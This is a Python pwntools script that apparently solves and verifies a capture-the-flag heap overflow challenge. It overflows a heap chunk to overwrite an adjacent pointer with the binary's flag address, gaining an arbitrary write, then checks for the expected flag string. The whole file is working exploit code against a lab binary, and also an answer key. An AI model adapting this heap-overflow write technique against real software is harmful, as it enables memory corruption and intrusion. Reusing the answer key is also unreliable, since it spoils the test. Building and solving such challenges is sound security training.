#!/usr/bin/env python3
from pathlib import Path

from pwn import ELF, context, p64, process

HERE = Path(__file__).resolve().parent
BINARY = HERE / "heap_overflow"
EXPECTED = b"KSJ{HEAP_OVERFLOW_AAW_VERIFIED}"

context.binary = elf = ELF(str(BINARY), checksec=False)
context.log_level = "error"
tube = process([str(BINARY)], cwd=str(HERE))


def create() -> None:
    tube.sendlineafter(b"> ", b"1")


def insert(index: int, data: bytes) -> None:
    tube.sendlineafter(b"> ", b"2")
    tube.sendlineafter(b"index: ", str(index).encode())
    tube.sendlineafter(b"size: ", str(len(data)).encode())
    tube.sendafter(b"data: ", data)


def modify(index: int, data: bytes) -> None:
    tube.sendlineafter(b"> ", b"3")
    tube.sendlineafter(b"index: ", str(index).encode())
    tube.sendlineafter(b"size: ", str(len(data)).encode())
    tube.sendafter(b"data: ", data)


create()
insert(0, b"A" * 8)
create()
insert(1, b"B" * 8)

# ptr[0]'s 0x20-sized chunk is immediately before the second Data object.
modify(0, b"C" * 0x20 + p64(elf.sym["flag"]))
modify(1, p64(0x31337))
tube.sendlineafter(b"> ", b"4")
output = tube.recvuntil(EXPECTED, timeout=2)
assert EXPECTED in output, output
print(f"[PASS] heap_overflow: AAW target flag={elf.sym['flag']:#x}")
tube.close()
